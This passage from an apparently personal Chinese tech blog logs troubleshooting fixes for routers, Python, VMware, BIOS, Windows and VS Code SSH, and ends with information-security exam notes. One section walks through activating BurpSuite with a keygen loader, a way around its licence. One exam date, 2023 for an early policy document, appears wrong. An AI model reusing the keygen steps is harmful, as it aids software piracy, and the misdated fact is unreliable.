<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = a; i &lt;= b; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">9989900</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">int</span> temp = i;</span><br><span class="line"><span class="built_in">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (temp != <span class="number">0</span>) &#123;</span><br><span class="line">result = result * <span class="number">10</span> + temp % <span class="number">10</span>;</span><br><span class="line">temp /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result == i) &#123;</span><br><span class="line"><span class="built_in">int</span> n = sqrt(i);</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">2</span>; j &lt;= n; ++j) &#123;</span><br><span class="line"><span class="keyword">if</span> (i % j == <span class="number">0</span>) &#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line">cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="呜呜呜-新学期网叕G了20230222"><a href="#呜呜呜-新学期网叕G了20230222" class="headerlink" title="呜呜呜 新学期网叕G了20230222"></a>呜呜呜 新学期网叕G了20230222</h1><p>首先是一个误区</p><p>在重启路由器的时候电源要连上，但是网线是不连的，进行一系列的操作之后再连接网线和网口。</p><p>还有一个不知道的是路由器的网口连接用的是WAN口，而不是LAN</p><p>LAN和WLAN的区别</p><p>LAN全称Local Area Network 中文名即局域网，在某一个区域多台计算机互联成计算机组，适用于接电脑的网线</p><p>WLAN全称Wireless LAN无线局域网，空中进行通信连接</p><p>全过程就是</p><p>先拿一个路由器，只插上电源之后，现在的网络是一个开放的网络，可以直接连接，进行路由器的初始化，设置好路由器的名称密码等等：</p><p>怕忘记所以就将管理员密码和WiFi设置成了同一个</p><p>弄好了之后将网线插好，由于是无线连接所以使用的是将网口和路由器的WLAN口连接，连好了之后就好了。</p><p>出现的界面是：<code>本次输入的宽带账号已在线 请勿重复登录拨号报错691</code></p><p>造成的原因有：</p><ol><li>宽带账号欠费停机——充值缴费</li><li>宽带拨号账号和密码输入错误——重置密码 </li><li>宽带上网账号卡在运营商服务器上（本该有信号。但是无法上网）——需要联系客服将宽带端口优化刷新，设备进行断电，5分钟之后在重启就好了</li></ol><p>重启之后就可以正常上网了</p><h1 id="可恶啊-python装不上z3-20221114"><a href="#可恶啊-python装不上z3-20221114" class="headerlink" title="可恶啊 python装不上z3(20221114)"></a>可恶啊 python装不上z3(20221114)</h1><p>呜呜呜~</p><p>将电脑中的所有python相关的所有东西全部卸载掉之后，重新下，才发现是一个极为方便的修复方法</p><h2 id="python3的重装"><a href="#python3的重装" class="headerlink" title="python3的重装"></a>python3的重装</h2><h3 id="卸载："><a href="#卸载：" class="headerlink" title="卸载："></a>卸载：</h3><p>首先一定不要先将launcher给删除掉，血的教训，我服了，如果和我一样先把这玩意儿给卸了的话，就会出现一堆的错误，但总的来说还是在文件查找上出现了错误。</p><p>命令：</p><p><code>del xxx文件名</code>删除顽固的文件。</p><h3 id="为了两种版本的python能够共存，要改掉名字。"><a href="#为了两种版本的python能够共存，要改掉名字。" class="headerlink" title="为了两种版本的python能够共存，要改掉名字。"></a>为了两种版本的python能够共存，要改掉名字。</h3><h4 id="安装python3-6"><a href="#安装python3-6" class="headerlink" title="安装python3.6"></a>安装python3.6</h4><p>在文件的途径上也要注意，要尽量简单一些</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668404120905-dd8a68b2-9b6f-43cd-87ff-6e330d0794f7.png"                      alt="img"                ></p><p>这里勾选的“Add Python 3.5 to PATH”是放在的用户变量中的。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668404219007-ba99af70-5443-47c4-8023-5fdd596afab3.png"                      alt="img"                ></p><p>再进行手动设置环境变量</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668420767958-90d461b8-7667-4239-8628-3179458f2816.png"                      alt="img"                ></p><p>同样的方法在安装一次python2</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668420922151-ac29ba78-51a2-4569-aa58-43ede27447a9.png"                      alt="img"                ></p><p>将原来的<code>python.exe</code>和<code>pythonw.exe</code>都改成<code>python3.exe</code>和<code>pythonw3.exe</code></p><h4 id="python2的安装"><a href="#python2的安装" class="headerlink" title="python2的安装"></a>python2的安装</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668421597709-3cbd7125-e1d0-460d-8da8-0f192473af76.png"                      alt="img"                ></p><p>改名字</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668421684044-3ee291a6-4b76-415c-8344-34bc7d86e877.png"                      alt="img"                ></p><p>差不多就是这样子了</p><h3 id="设置pip，使得两种pip共存"><a href="#设置pip，使得两种pip共存" class="headerlink" title="设置pip，使得两种pip共存"></a>设置pip，使得两种pip共存</h3><p>之前已经改换掉名字了，之后要强制重新安装一下pip，在根目录打开命令行，输入：</p><p>python3</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure></div><p>python2</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure></div><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>python3的安装好了</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/Something.assets/1668421875992-4b663a0d-66c8-410a-ac3a-8b4e9f2ca82e.png"                      alt="img"                ></p><hr><h2 id="全部推翻！！"><a href="#全部推翻！！" class="headerlink" title="全部推翻！！"></a>全部推翻！！</h2><p>python3.6的环境也是可以将z3进行安装的。</p><p>但是前提就是你的python足够干净。所以在之前要将之前电脑里面有的python全部清空之后，重新安装一次python。</p><p>和上面的重装的方式一样</p><ol><li>自定义一个相对好找的位置来放这个python的文件，还有就是放在C盘下，新建文件为python36</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668425932541-133de46c-b17a-4882-8fa7-fcf3336fd959.png"                      alt="img"                ></p><ol><li>用户环境不用配置，需要手动配置系统环境。</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668426009789-b77d4da8-3221-4861-94f3-841f8cd0ded8.png"                      alt="img"                ></p><p>配置好了。</p><ol><li>直接输入命令<code>pip install z3-solver</code></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668426062317-ffae97e1-a07f-44b8-8ff0-bf4a3b4f348d.png"                      alt="img"                ></p><p>此时观察到</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668426106100-0820a840-a4bc-4235-8889-11b8aaf7047b.png"                      alt="img"                ></p><p>多了一个bin文件，惊喜就出来了！！</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1668426121912-0179c8b6-2519-493f-ab26-66038ac93d74.png"                      alt="img"                ></p><h1 id="BurpSuite这个软件G了之后的重新下载-20221106"><a href="#BurpSuite这个软件G了之后的重新下载-20221106" class="headerlink" title="BurpSuite这个软件G了之后的重新下载(20221106)"></a>BurpSuite这个软件G了之后的重新下载(20221106)</h1><p>首先是Java环境的问题，我的Java环境原来是1.7的，点了run之后死活也跳不出来小弹框，所以问了同学之后发现是使用的坏境是错误的，怎么办？能想到的办法只能换！</p><h2 id="1-原Java环境的卸除"><a href="#1-原Java环境的卸除" class="headerlink" title="1.原Java环境的卸除"></a>1.原Java环境的卸除</h2><p>先是在控制面板里将一开始的两个这样的Java 7 Update  Java SE Development Kit 7的应用全部卸载掉。发现卸载完了之后原文件都会一并被删除掉，所以不用再人工去删一些不必要的文件了。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667668275713-5e562423-0807-4e4b-b461-737e4fee39f2.png"                      alt="img"                ></p><h2 id="2-配置新的Java8环境"><a href="#2-配置新的Java8环境" class="headerlink" title="2.配置新的Java8环境"></a>2.配置新的Java8环境</h2><p><strong>需要安装 jdk-8u261-windows-x64.exe</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667668469216-aabcc0cc-1772-48be-9384-580bf8cf532a.png"                      alt="img"                ></p><p>这是从学习通老师那里白嫖的，感谢我的Java老师，太爱了，一度给了激活idea的教程</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667668533587-d59be024-0dcd-4b89-83bb-71a77ba7c413.png"                      alt="img"                ></p><p>直接 下一步</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667668558428-19568af9-d786-48cf-80e4-60507c92a810.png"                      alt="img"                >放在C盘里，默认不变，直接 下一步  等待安装好</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667668584313-3f55f198-7311-46fc-9074-6806c1a2c2dd.png"                      alt="img"                ></p><p>安装好了之后，一般环境配置都是自动配置好的，但还是可以检查一下，系统环境配置一下</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667668997273-c06b1dc1-442c-4771-a0d9-3d95f2567d95.png"                      alt="img"                ></p><p>这样Java部分的全部工作就做好了</p><h2 id="3-安装BurpSuite"><a href="#3-安装BurpSuite" class="headerlink" title="3.安装BurpSuite"></a>3.安装BurpSuite</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669072979-7e4d7ad3-c5d8-454c-b4cd-f7094ad807ab.png"                      alt="img"                ></p><p>解压后的文件中一般都是这样的四个文件</p><p>首先，双击打开burp-loader-keygen.jar文件，复制Lisence中的内容，然后点击Run（就是这里的run是需要的Java1.8的环境来运行出来）</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669131744-9463bb87-42a8-4405-9b8f-93312b7f1609.png"                      alt="img"                ></p><p>出现弹框之后</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669180355-6d40a585-a64e-432d-a022-e3f590e953bc.png"                      alt="img"                ></p><p>直接<code>I Accept</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669204944-4b3579b0-90b4-4155-88f9-bd313b4ed3f8.png"                      alt="img"                ></p><p>将上面复制Lisence中的内容粘贴在这里，粘贴好之后点Next</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669276872-55fe41c2-9d09-4997-b63d-4868788a66e1.png"                      alt="img"                ></p><p> 点击<code>Manual activation</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669298174-51554f82-3270-4122-9ded-d9fe88535e9b.png"                      alt="img"                ></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy request`将第二个框里的内容复制到上面第一张图的`Activation Request`中去，会自动填补出`Activation Response`的内容，将这个自动填补`Activation Responsed`的内容复制放在`paste response`中去点击`next</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669616172-5edf4445-29e2-485e-8e55-8bf255c3b8b1.png"                      alt="img"                ></p><p>就安装成功85%了，点击<code>finish</code>进入到软件的页面</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669675689-c3e79048-5cd6-460a-b703-b1b8b0b314f6.png"                      alt="img"                ></p><p>点击<code>next</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669716468-9fcd772b-69a8-44bf-ac09-f69c691a644c.png"                      alt="img"                ></p><p>点击<code>Start Burp</code></p><p>下次要打开应用时直接点击下面的.bat文件才行</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667669875566-01fe72ae-41fb-46bd-a015-065f586d9da5.png"                      alt="img"                ></p><p>如果说点击的是第三个文件，还是会跳出之前未激活前的样子。BurpSuite就这样就安装好了！</p><p>开机出现的界面是找不到disk：</p><h4 id="no-boot-disk-has-been-detected-or-the-disk-has-failed"><a href="#no-boot-disk-has-been-detected-or-the-disk-has-failed" class="headerlink" title="no boot disk has been detected or the disk has failed"></a>no boot disk has been detected or the disk has failed</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667464145537-b5f3b425-02bb-468b-b6c5-a899deb5409b.png"                      alt="img"                ></p><p>大概就是下图这样的界面，感觉像是系统的问题，所以要进入到BIOS界面去改动。老样子还是百度。</p><ol><li>首先要进入BIOS设定页面，想到的就是在刚要开机的时候就开始按相应的快捷键。百度到的台式机的进入的快捷键一般都是F2，F1,ESC键，但是按了之后发现还是没进入到想要的BIOS设定页面，所以百度找到台式机的统一的进入BIOS页面的快捷键是DELETE键，并且成功了</li><li>进入BIOS设定页面之后还是看不懂，按照百度上面写的： 将Authentication → Secure Boot→把 Enabled调成 Disabled</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667464906063-1c15b180-2026-49d2-97ca-415e2dbb2397.png"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667465162935-a2fa42fd-5411-48c9-8c55-8532026091f5.png"                      alt="img"                ></p><p>最后呈现成这个样子。</p><ol><li>再找到Boot Options → Launch CSM →把 Never 改成 Always。</li><li>最后到EXIT的界面，第一个就是save and exit setup,电脑自动重启之后就大功告成了</li></ol><p>注：改的时候会发现右下角会有提示，其中有一个大意是使用+-来改变选项。一般的↑↓←→是用来选择</p><h1 id="关于我的网差点又G了-20221102"><a href="#关于我的网差点又G了-20221102" class="headerlink" title="关于我的网差点又G了(20221102)"></a>关于我的网差点又G了(20221102)</h1><h2 id="1-虚拟机VMware网络问题"><a href="#1-虚拟机VMware网络问题" class="headerlink" title="1.虚拟机VMware网络问题"></a>1.虚拟机VMware网络问题</h2><p>首先是爆出</p><ul><li>VMware network adapter VMnet1没有有效的IP配置</li><li>VMware network adapter VMnet8没有有效的IP配置</li><li>NAS无响应</li></ul><p>解决方式是：</p><p>win+r呼唤出运行界面输入：services.msc</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667382247166-6fd7d09c-0172-4988-b21a-969d5a2e410a.png"                      alt="img"                ></p><p>跳转到这个界面，找里面的VMware NAT service 和VMware DHCP service两个服务，启动两个服务就好。</p><h2 id="2-代理服务器拒绝连接"><a href="#2-代理服务器拒绝连接" class="headerlink" title="2.代理服务器拒绝连接"></a>2.代理服务器拒绝连接</h2><p>第二个遇到的问题就是如下图这样的界面。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667382026560-46d95dac-7fb4-4816-bce3-205eded22175.jpeg"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667381489509-63354319-3781-4072-8f52-c4287c8edcfd.png"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667381512984-56f41cf0-1cd9-44d5-ad4c-c296ec793fdc.png"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667381695531-1cc58063-be5d-4fa4-84de-ddb711b17aee.png"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1667381684374-1d5642f6-63d4-468e-8f8e-0b58291c2571.png"                      alt="img"                ></p><p>这里开启的代理服务器给关掉终于恢复了要解决的问题&#x2F;(ㄒoㄒ)&#x2F;~~</p><p>我真的不知道为啥我的网会G掉，听师傅说的是可能因为路由器里面有东西卡了，那就记录一下暂时性的解决方法叭</p><p>首先，切内网与外网的状态，登录本地管理地址<a class="link"   href="http://192.168.10.1/" >192.168.10.1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1662200425223-0def4bfb-3ea8-4836-a2fa-459a024ee2bb.png"                      alt="img"                ></p><p>点击右上角的“简易设置界面”，有一个上网设置</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1662200482675-337c7972-4f15-4c6d-811b-71588867dbaf.png"                      alt="img"                ></p><p>点击之后，下图的状态就是在学校内网的状态，如果想切回外网的状态的话，就是将模式给改掉</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1662200498635-9eaeb825-5d47-406d-a559-8efc756c3e38.png"                      alt="img"                ></p><p>本来是IPoE的状态，改为PPPoE的状态就好了</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1662200567739-eb67e174-d1e9-41e9-94c6-78dd4a1cdde0.png"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1662200598015-9cf6d4df-72f5-42b4-88fa-eb6c7e9177d5.png"                      alt="img"                ></p><p>但需要的是将用户名称输入进去，我觉得应该是可以自定义的，这样的话，就切入到了外网的状态，手机和电脑就可以同时使用了</p><h1 id="关于win7系统重新安装win10-20220822"><a href="#关于win7系统重新安装win10-20220822" class="headerlink" title="关于win7系统重新安装win10(20220822)"></a>关于win7系统重新安装win10(20220822)</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>拿到的win7系统发现设备都挺老化的挺严重的，而且好长时间没重新开过了，所以一台电脑是越用越新的，而不是说放在那边保存好就是对的，可能外机没坏内里已经跟不上了</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>将win7系统整顿一下：拿到机器之后发现太卡了，直接把一些拖慢进程的软件全部删掉了，删掉之后发现速度快了不少。</p><p>其他的找系统内的更新，更新的时间挺长的。后面感觉这一步好像挺多余的。</p><h2 id="其次"><a href="#其次" class="headerlink" title="其次"></a>其次</h2><p>找win10的镜像代替文件，</p><p><a class="link"   href="https://windows.xnlyr.cn/course.html" >https://windows.xnlyr.cn/course.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>装机教程是这样的</p><p>首先将iso文件解压，解压后是这样的，直接双击硬盘安装，直接安装。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1661180671911-082360a1-7568-4763-96d9-fb77de1455ef.png"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1661180722806-abcad174-1361-46b0-b198-885f75d604b0.png"                      alt="img"                ></p><p>之后等一下系统的自动安装</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1661180740399-aea0878b-8dee-4cfe-8dc1-be9b71dd78ac.png"                      alt="img"                ></p><p>安好后屏幕会变黑掉，还会发出叫声巨吵，之后等待，会进入到BIOS系统，如果说不懂的话，直接Exiting and saving退出这个系统就好了。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>win10系统可以说就装好了，这是需要继续布置测试一下就好了</p><h1 id="关于vscode连接服务器的ssh-20220805"><a href="#关于vscode连接服务器的ssh-20220805" class="headerlink" title="关于vscode连接服务器的ssh(20220805)"></a>关于vscode连接服务器的ssh(20220805)</h1><p>根据学习的东西，想将脚本放在服务器上跑，直接用服务器的ssh连接，找了很多资料，最终搞了一天弄出来了，有一些需要注意的地方，记录一下。</p><p>首先要有服务器的用户，这里首先用我的root用户实验</p><p>快捷键shift+ctrl+p呼唤命令行</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1659926508230-1523ff12-a9bd-4456-b9cf-aff11a2a791a.png"                      alt="img"                ></p><p>输入ssh open</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1659926554575-da3e4301-5af1-4ec2-b402-041017a7e9aa.png"                      alt="img"                ></p><p>适配的文件在C:&#x2F;uesr&#x2F;Administrator&#x2F;.ssh&#x2F;config的位置将里面的文件内容写上相关的内容</p><p>Host <a class="link"   href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x78;&#x78;&#46;&#x78;&#120;&#46;&#x78;&#x78;&#46;&#x78;&#120;" >&#114;&#x6f;&#x6f;&#116;&#x40;&#x78;&#x78;&#46;&#x78;&#120;&#46;&#x78;&#x78;&#46;&#x78;&#120; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p><p>Hostname xx.xx.xx.xx</p><p>User root </p><p>port 22 如下图示：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1659926136653-e6f2184a-9456-4fd0-a195-c59a64908dc3.png"                      alt="img"                ></p><p>安装vscode的拓展，并且设置好拓展</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1659926207559-739d2189-50bb-48fc-9b64-2c677c554ab5.png"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1659926273054-55219c91-2f4d-44fe-bfd0-449e355e3fab.png"                      alt="img"                >设置好了之后可以点远程连接的按钮，进行连接测试</p><p>快捷键shift+ctrl+p输入ssh connect回车确认后选择操作系统</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1659927835292-51fd287a-4270-406a-aca3-6e9b1b0584e0.png"                      alt="img"                >我的服务器是Linux所以我选择了Linux的系统连接</p><p>进入后输入服务器ssh的密码就连接好了</p><p>连接完成大概是这个样子；</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1659927962778-751dd32c-dd5c-47d2-b95b-2a6ddeec5be6.png"                      alt="img"                >当然我们不能用服务器的最高权限只用来跑代码（如果跑G了，服务器就G了</p><p>所以我们可以在服务器上开一个单独的用户给vscode</p><p>连接服务器的后台终端在里面输入以下命令进行修改：</p><p>查看服务器的用户 <code>cat /etc/passwd</code></p><p>增加服务器的用户 <code>useradd -u 777 -d /usr/vscoder -g users -m vscoder</code></p><p><code>adduser vscoder</code></p><p><code>passwd vscoder</code>重复输入两次密码来改vscoder这个用户的密码</p><p>改好之后将上面的改掉</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/Something.assets/1659928351430-7846ab42-07b6-4be1-9fb9-f848d4c839e5.png"                      alt="img"                ></p><p>做到这一步就与上面无异了，直接连接输入密码就好了。</p><h1 id="信息安全三级分不清的考点"><a href="#信息安全三级分不清的考点" class="headerlink" title="信息安全三级分不清的考点"></a>信息安全三级分不清的考点</h1><h1 id="年份整理"><a href="#年份整理" class="headerlink" title="年份整理"></a>年份整理</h1><ol><li>当代信息安全学起源<strong>20世纪<strong><strong>40年代</strong></strong>通信保密</strong></li><li>电子认证服务提供者应当妥善保存与认证相关的信息，信息保存期限至少为电子签名认证证书失效后<strong>5年</strong></li><li>香农<strong>1949</strong>年发表论文<strong>《保密系统的通信理论》</strong>，用信息论的观点对保密问题进行了全面的论述，它是信息安全发展的重要里程碑。</li><li><strong>1972</strong>年完成的著名<strong>Anderson报告</strong>，是计算机安全发展的重要里程碑</li><li>数据加密标准DES制定的年份是<strong>1977</strong></li><li>1985 ECC加密算法提出（椭圆曲线密码学）</li><li><strong>1994</strong>美国联邦政府颁布数字签名标准（DSS）的年份.</li><li><strong>1996，</strong>国际标准ISO 15408 <strong>GB&#x2F;T18336</strong>的标准<strong>（CC）信息技术安全评价通用标准</strong>   *信息技术安全评估标准（ITSEC）</li><li>组织机构实施信息安全管理体系认证所根据的国际信息安全管理标准是<strong>BS7799</strong></li><li>AES是<strong>2001</strong></li><li>国家秘密保密期限：绝密级<strong>不超过三十年</strong>，机密级不超过<strong>二十年</strong>，秘密级不超过<strong>十年。</strong></li><li>《网络安全法》颁布时间：<strong>2016</strong></li><li><strong>2023年9月</strong>中央颁布的《国家信息化领导小组关于加强信息安全保障工作的意见》（中办发27号文件），标志着我国信息安全保障体系建设工作的开始</li></ol><h1 id="专业名词"><a href="#专业名词" class="headerlink" title="专业名词"></a>专业名词</h1><ol><li>AAA： 认证、授权、审计（Authentication-Authorization-Accounting）</li><li><strong>数据执行保护(DEP)</strong>:（1）<strong>限制</strong>内存堆栈区的代码为<strong>不可执行</strong>的状态，从而<strong>防范溢出</strong>后代码执行的技术；（2）将内存敏感区域设置为不可执行状态，从而溢出后即使跳转到恶意代码的地址，恶意代码也无法运行</li><li><strong>模糊测试****（fuzzing）</strong>：通过向目标软件<strong>输入大量</strong>的<strong>畸形数据</strong>并<strong>监测</strong>目标系统的<strong>异常</strong>来发现潜在的软件漏洞</li><li><strong>渗透测试****：模拟黑客</strong>可能使用的攻击技术和漏洞发现技术，对目标系统的安全做深入的探测，发现系统<strong>最脆弱</strong>的环节</li><li><strong>滑板指令****：</strong>大量NOP空指令0x90填充组成的指令序列</li><li>综合漏洞扫描：IP地址扫描、网络端口扫描、漏洞扫描、弱口令扫描、注入攻击、SQL注入扫描</li><li>专项定向扫描：恶意程序扫描（病毒扫描）</li><li><strong>蠕虫（worm）</strong>：可通过<strong>网络</strong>等途径，自动将自身的全部代码或部分代码，通过网络复制、传播给其他网络中计算机的完全独立可运行程序</li><li><strong>基本</strong>风险评估（参照风险评估×）：只参照标准所提到的风险项对组织机构的资产进行风险评估的方法</li><li>出现漏洞的可能性是指成功攻击机构内某个漏洞的<strong>概率</strong>。</li><li>P2DR模型美国ISS提出的动态网络安全体系（动态安全模型的雏形）：**策略(Policy)**、防护(Protection)、检测(Detection)、响应(Response)</li><li>事故响应：计划、反应、恢复</li><li><strong>网络舆情分析****：</strong>网络信息<strong>内容监控</strong>的主要方法</li><li>IDS异常检测技术通过<strong>统计分析方法</strong>和<strong>神经网络方法</strong>实现</li><li>网络信息内容审计系统分为:<strong>流水线</strong>模型和<strong>分段</strong>模型</li><li>整数溢出：符号问题、运算溢出、存储溢出</li><li>风险管理：风险的<strong>识别</strong>、风险的分析、风险控制策略</li><li>数据库安全防护三个阶段：事前检查、事中监控、事后<strong>审计</strong></li><li>软件安全开发：建立<strong>安全威胁</strong>模型、安全设计、安全编码、安全测试</li><li>微软SDL模型的中文全称：<strong>软件****安全开发生命周期</strong>模型</li><li>软件安全监测技术中，定理证明属于软件<strong>静态</strong>安全监测技术</li><li><strong>入侵检测系统</strong>可以实现事中防护：入侵检测系统可通过与<strong>防火墙</strong>联动从而实现动态防护</li><li><strong>入侵防御系统IPS</strong>具有拦截和检测功能</li><li>防火墙体系结构：屏蔽<strong>路由器</strong>、<strong>双重宿主主机体系</strong>结构、屏蔽<strong>主机体系</strong>结构、屏蔽<strong>子网体系</strong>结构yes√ 屏蔽中间网络体系结构 no×</li><li>NAT三种类型：端口地址转换PAT、NAT池、静态NATyes√ <strong>动态NAT no×</strong></li><li>数据库软件执行三种类型的完整性服务：<strong>语义</strong>完整性、<strong>参照</strong>完整性、实体完整性</li><li>《信息系统安全保护等级划分准则》提出四个要素：信息系统所属类型、<strong>业务数据</strong>类型、信息系统服务范围、业务自动化处理程度</li><li>Hosts文件</li><li>采用SSL协议，传输层协议就是<strong>TCP</strong></li><li>风险识别和风险<strong>控制</strong></li><li>数据执行保护技术：DEP限制内存堆栈区的代码为<strong>不可执行状态</strong>从而防范溢出后代码执行</li><li>ESP基于IPSec的数据通信提供安全的保护机制不包括：加密存储no×  安全加密、身份认证、数据完整性鉴别</li><li>HeapSpray攻击导致被攻击进程的内存占用非常大</li></ol><h1 id="UNIX-Linux系统"><a href="#UNIX-Linux系统" class="headerlink" title="UNIX&#x2F;Linux系统"></a>UNIX&#x2F;Linux系统</h1><ol><li>unix文件权限先是，第一个字母表示文件类型：p,d,l,s,c,b,-</li></ol><h1 id="第一、首部"><a href="#第一、首部" class="headerlink" title="第一、首部"></a>第一、首部</h1><ol><li>中国首部真正意义上的信息化法律<strong>《电子签名法》</strong></li><li>风险管理第一阶段：风险的<strong>识别</strong></li><li><strong>我国</strong>发布的第一个有关信息安全方面的标准是在<strong>1985年</strong></li></ol><h1 id="模糊分不清"><a href="#模糊分不清" class="headerlink" 